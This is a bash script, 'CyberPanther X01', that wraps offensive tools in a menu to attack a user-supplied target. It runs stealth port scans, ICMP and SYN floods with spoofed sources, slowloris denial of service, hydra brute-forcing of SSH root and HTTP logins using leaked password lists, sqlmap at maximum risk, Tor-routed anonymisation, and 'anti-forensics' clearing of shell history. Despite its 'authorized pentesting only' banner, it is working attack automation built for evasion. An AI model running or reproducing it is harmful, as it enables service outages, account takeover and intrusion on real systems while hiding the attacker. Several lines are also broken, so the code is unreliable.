#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════╗
# ║                          CYBERPANTHER X01                            ║
# ║     STEALTH • DOS • BRUTEFORCE • WEB EXPLOITS • AUTO-REPORTING       ║
# ║                       AUTHORIZED PENTESTING ONLY                     ║
# ╚══════════════════════════════════════════════════════════════════════╝

# =============================================================================
# GLOBAL CONFIGURATION
# =============================================================================
set -euo pipefail

# Dependencies
DEPS=(dialog masscan nmap hydra gobuster nikto sqlmap ffuf proxychains tor 
      hping3 slowhttptest curl wget nc wordlists unzip)

# Colors
RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m'
PURPLE='\033[0;35m' CYAN='\033[0;36m' GRAY='\033[0;37m' BOLD='\033[1m' NC='\033[0m'
BGGREEN='\033[42m' BGRED='\033[41m'

# Global variables
TARGET="" TARGET_URL="" OUTPUT_DIR="" STEALTH_MODE=false DOS_MODE=false
OPEN_PORTS=() VULNS_FOUND=() CREDS_FOUND=()

# =============================================================================
# INSTALLER & SETUP
# =============================================================================
install_dependencies() {
    echo -e "${PURPLE}📦 Installing CyberPanther dependencies...${NC}"
    sudo apt update -qq >/dev/null 2>&1
    
    for dep in "${DEPS[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${YELLOW}Installing $dep...${NC}"
            sudo apt install -y "$dep" -qq >/dev/null 2>&1 || true
        fi
    done
    
    # Setup TOR
    sudo systemctl restart tor >/dev/null 2>&1
    sleep 3
    
    # Wordlists
    [[ ! -d "/usr/share/seclists" ]] && {
        echo -e "${YELLOW}Downloading SecLists...${NC}"
        git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists >/dev/null 2>&1
    }
    
    echo -e "${GREEN}✅ Installation complete!${NC}"
}

banner() {
    clear
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                       CYBERPANTHER X01                               ║
║                  ULTIMATE PENTESTING SUITE - STEALTH + DOS + EXPLOITS                ║
║                          AUTHORIZED RED TEAM OPERATIONS ONLY                         ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
EOF
}

# =============================================================================
# STEALTH ENGINE
# =============================================================================
enable_stealth() {
    STEALTH_MODE=true
    echo -e "${CYAN}🥷 STEALTH MODE ACTIVATED${NC}"
    
    # Kill obvious processes
    sudo pkill -f masscan nmap hydra gobuster 2>/dev/null || true
    
    # Proxychains stealth config
    cat > /tmp/proxychains_stealth.conf << 'EOF'
dynamic_chain
quiet_mode
socks5 127.0.0.1 9050
EOF
}

# =============================================================================
# PORT SCANNING ENGINE
# =============================================================================
stealth_portscan() {
    local rate=100
    [[ "$STEALTH_MODE" = true ]] && rate=30
    
    OUTPUT_DIR="./cyberpanther_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"
    
    echo -e "${YELLOW}🔍 STEALTH PORT SCAN ($rate pps)${NC}"
    
    # Masscan + Nmap combo
    sudo masscan -p1-65535 "$TARGET" --rate="$rate" --wait=5 \
        -oG "$OUTPUT_DIR/ports.grep" 2>/dev/null | tee "$OUTPUT_DIR/masscan.log"
    
    mapfile -t OPEN_PORTS < <(grep "open" "$OUTPUT_DIR/ports.grep" | awk '{print $3}' | cut -d/ -f1)
    
    # Stealth Nmap
    [[ "$STEALTH_MODE" = true ]] && {
        sudo nmap -sS -T2 -Pn --scan-delay 2s \
            -p "${OPEN_PORTS[*]}" "$TARGET" \
            -oA "$OUTPUT_DIR/stealth_nmap"
    }
    
    echo -e "${GREEN}📡 ${#OPEN_PORTS[@]} OPEN PORTS: ${OPEN_PORTS[*]}${NC}"
}

# =============================================================================
# DOS ATTACK ENGINE
# =============================================================================
dos_menu() {
    DOS_CHOICE=$(dialog --clear --backtitle "🐾 CyberPanther DOS Suite" \
        --title " 💥 DOS ATTACKS 💥 " \
        --menu "Select attack:" 18 70 6 \
        1 "🌐 ICMP Flood (Any IP)" \
        2 "🔥 SYN Flood Open Ports" \
        3 "🐌 Slowloris HTTP" \
        4 "⚡ Full DOS Auto" \
        0 "Back" \
        3>&1 1>&2 2>&3)

    case $DOS_CHOICE in
        1) icmp_flood ;;
        2) syn_port_flood ;;
        3) slowloris_dos ;;
        4) full_dos_auto ;;
        0) return ;;
    esac
}

icmp_flood() {
    TARGET=$(dialog --inputbox "🌐 ICMP Target IP:" 10 50 3>&1 1>&2 2>&3)
    sudo timeout 120 hping3 --icmp --flood --rand-source "$TARGET" 2>&1 | tee "$OUTPUT_DIR/icmp.log" &
}

syn_port_flood() {
    for PORT in "${OPEN_PORTS[@]}"; do
        sudo timeout 60 hping3 -S -p "$PORT" --flood --rand-source "$TARGET" 2>&1 | tee "$OUTPUT_DIR/syn_$PORT.log" &
    done
    wait
}

slowloris_dos() {
    TARGET_URL=$(dialog --inputbox "🐌 Slowloris URL:" 10 60 3>&1 1>&2 2>&3)
    sudo timeout 180 slowhttptest -c 1500 -H -u "$TARGET_URL" -i 10 -r 200 2>&1 | tee "$OUTPUT_DIR/slowloris.log" &
}

full_dos_auto() {
    echo -e "${RED}💥 FULL DOS AUTO${NC}"
    icmp_flood &
    syn_port_flood &
    [[ -n "$TARGET_URL" ]] && slowloris_dos &
    sleep 120; pkill -f hping3 slowhttptest
}

# =============================================================================
# BRUTEFORCE ENGINE
# =============================================================================
bruteforce_services() {
    echo -e "${YELLOW}🔐 BRUTEFORCE ATTACKS${NC}"
    
    # SSH Bruteforce
    [[ " ${OPEN_PORTS[*]} " =~ "22 " ]] && {
        proxychains -q hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
            ssh://"$TARGET" -t 4 -w 10 -o "$OUTPUT_DIR/ssh_creds.txt" &
    }
    
    # HTTP Basic Auth
    for PORT in 80 443 8080 8443; do
        [[ " ${OPEN_PORTS[*]} " =~ " $PORT " ]] && {
            proxychains -q hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
                -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
                "$TARGET" http-get / -s "$PORT" -t 4 -w 10 -o "$OUTPUT_DIR/http_$PORT.txt" &
        }
    done
    wait
}

# =============================================================================
# WEB EXPLOIT ENGINE
# =============================================================================
web_exploitation() {
    echo -e "${YELLOW}🌐 WEB EXPLOITATION${NC}"
    
    # Directory enumeration
    [[ " ${OPEN_PORTS[*]} " =~ "80 " || " ${OPEN_PORTS[*]} " =~ "443 " ]] && {
        proxychains -q gobuster dir -u "http://$TARGET" \
            -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
            -t 20 --delay 1s -o "$OUTPUT_DIR/gobuster.txt" &
        
        proxychains -q nikto -h "http://$TARGET" -o "$OUTPUT_DIR/nikto.txt" &
    }
    
    # SQL Injection
    sqlmap -u "http://$TARGET" --batch --risk=3 --level=5 --dbs -o "$OUTPUT_DIR/sqlmap.txt" &
    
    wait
}

# =============================================================================
# MAIN TUI MENU
# =============================================================================
main_menu() {
    CHOICE=$(dialog --clear --backtitle "🐾 CyberPanther Ultimate" \
        --title " 🔥 ULTIMATE PENTEST SUITE 🔥 " \
        --menu "Select operation:" 25 90 12 \
        1 "🥷 FULL STEALTH AUTO (Recommended)" \
        2 "🔍 Stealth Port Scan Only" \
        3 "💥 DOS Attacks" \
        4 "🔐 Bruteforce Services" \
        5 "🌐 Web Enumeration + Exploits" \
        6 "⚙️ Stealth Mode Toggle" \
        7 "📊 Generate Report" \
        8 "🧹 Clean Traces" \
        0 "❌ Exit" \
        3>&1 1>&2 2>&3)

    case $CHOICE in
        1) 
            TARGET=$(dialog --inputbox "🥷 Target IP:" 10 50 3>&1 1>&2 2>&3)
            enable_stealth
            stealth_portscan
            bruteforce_services
            web_exploitation
            generate_report
            ;;
        2) 
            TARGET=$(dialog --inputbox "🔍 Target IP:" 10 50 3>&1 1>&2 2>&3)
            stealth_portscan
            ;;
        3) dos_menu ;;
        4) bruteforce_services ;;
        5) web_exploitation ;;
        6) [[ "$STEALTH_MODE" = true ]] && STEALTH_MODE=false || STEALTH_MODE=true; 
           echo -e "${STEALTH_MODE && echo "${CYAN}🥷 Stealth ON${NC}" || echo "${RED}👻 Stealth OFF${NC}"}" ;;
        7) generate_report ;;
        8) cleanup ;;
        0) cleanup; exit 0 ;;
    esac
}

# =============================================================================
# REPORTING ENGINE
# =============================================================================
generate_report() {
    [[ -z "$OUTPUT_DIR" ]] && echo -e "${YELLOW}No scan data found${NC}" && return
    
    cat > "$OUTPUT_DIR/🐾_FINAL_REPORT.html" << EOF
<!DOCTYPE html>
<html>
<head><title>CyberPanther Report</title>
<style>body{font-family:monospace;background:#000;color:#00ff00}</style>
</head>
<body>
<h1>🐾 CYBERPANTHER ULTIMATE REPORT</h1>
<h2>Target: $TARGET</h2>
<p><b>Open Ports:</b> ${#OPEN_PORTS[@]} → ${OPEN_PORTS[*]}</p>
<p><b>Stealth Mode:</b> $STEALTH_MODE</p>
<p><b>Output Directory:</b> $OUTPUT_DIR</p>
<h3>📁 Generated Files:</h3>
<pre>$(find "$OUTPUT_DIR" -name "*.txt" -o -name "*.log" | head -20)</pre>
</body>
</html>
EOF
    
    echo -e "${GREEN}📊 Report generated: $OUTPUT_DIR/🐾_FINAL_REPORT.html${NC}"
}

# =============================================================================
# CLEANUP & ANTI-FORENSICS
# =============================================================================
cleanup() {
    echo -e "${GRAY}🧹 Cleaning traces...${NC}"
    sudo pkill -f "hping3 slowhttptest hydra gobuster nmap masscan sqlmap" 2>/dev/null || true
    sudo systemctl stop tor 2>/dev/null || true
    rm -f /tmp/proxychains_stealth.conf 2>/dev/null || true
    history -c >/dev/null 2>&1
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================
trap cleanup EXIT INT TERM

install_dependencies
banner

while true; do
    main_menu
    sleep 1
done